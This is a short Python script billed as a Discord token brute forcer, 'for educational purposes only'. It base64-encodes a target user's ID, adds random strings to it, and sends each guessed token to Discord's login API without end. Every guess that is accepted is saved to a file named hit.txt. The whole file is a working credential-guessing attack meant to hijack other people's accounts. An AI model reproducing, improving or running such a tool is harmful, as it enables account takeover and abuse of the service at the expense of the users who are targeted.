import base64
import os
import random
import string
import requests
from colorama import *
from pystyle import *


banner = '''
          ╔═╗╔═╗╔═╗  ╔╗ ╦═╗╦ ╦╔╦╗╔═╗╔═╗╔═╗╦═╗╔═╗╔═╗╦═╗
       	  ╚═╗║╣ ║    ╠╩╗╠╦╝║ ║ ║ ║╣ ╠╣ ║ ║╠╦╝║  ║╣ ╠╦╝
          ╚═╝╚═╝╚═╝  ╚═╝╩╚═╚═╝ ╩ ╚═╝╚  ╚═╝╩╚═╚═╝╚═╝╩╚═
                                               
       ╔══════════════════════════════════════════════╗
       ║              BruteForce 1.0.0.0              ║
       ║              coded by PJ0001                 ║
       ║        For Educational Purposes Only         ║
       ╚══════════════════════════════════════════════╝               
'''


os.system("clear")
print(Colorate.Horizontal(Colors.blue_to_purple, Center.XCenter(banner)))
id_to_token = base64.b64encode((input("ID TO TOKEN --> ")).encode("ascii"))
id_to_token = str(id_to_token)[2:-1]

while id_to_token == id_to_token:
    token = id_to_token + '.' + ('').join(random.choices(string.ascii_letters + string.digits, k=4)) + '.' + ('').join(random.choices(string.ascii_letters + string.digits, k=25))
    headers={
        'Authorization': token
    }
    login = requests.get('https://discordapp.com/api/v9/auth/login', headers=headers)
    try:
        if login.status_code == 200:
            print(Fore.GREEN + '[+] VALID' + ' ' + token)
            f = open('hit.txt', "a+")
            f.write(f'{token}\n')
        else:
            print(Fore.RED + '[-] INVALID' + ' ' + token)
    finally:
        print("")


input()
